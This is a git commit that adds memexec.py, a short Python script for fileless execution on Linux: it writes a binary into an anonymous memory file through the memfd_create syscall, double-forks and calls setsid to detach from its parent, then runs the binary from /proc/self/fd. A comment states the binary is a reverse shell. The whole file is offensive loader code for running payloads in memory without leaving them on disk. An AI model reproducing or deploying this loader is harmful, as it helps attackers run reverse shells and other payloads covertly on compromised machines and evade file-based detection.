9a16037d4bc24a0395d239f39d7c606a468f2f00
Steven Kusuman <52606428+0xd114@users.noreply.github.com>
2021-06-12 17:07:26 +0700

    Add files via upload

---
+++ memexec.py
@@ -0,0 +1,20 @@
+import ctypes
+import sys
+import os
+# read the executable file. It is a reverse shell in our case
+binary = open(sys.argv[1],'rb').read()
+
+fd = ctypes.CDLL(None).syscall(319,"",1) # call memfd_create and create an anonymous file
+final_fd = open('/proc/self/fd/'+str(fd),'wb') # write our executable file.
+final_fd.write(binary)
+final_fd.close()
+
+fork1 = os.fork() #create a child
+if 0 != fork1: os._exit(0)
+
+ctypes.CDLL(None).syscall(112) # call setsid() to create a parent.
+
+fork2 = os.fork() #create a child from the parent. 
+if 0 != fork2: os._exit(0)
+
+os.execl('/proc/self/fd/'+str(fd),'argv0','argv1')
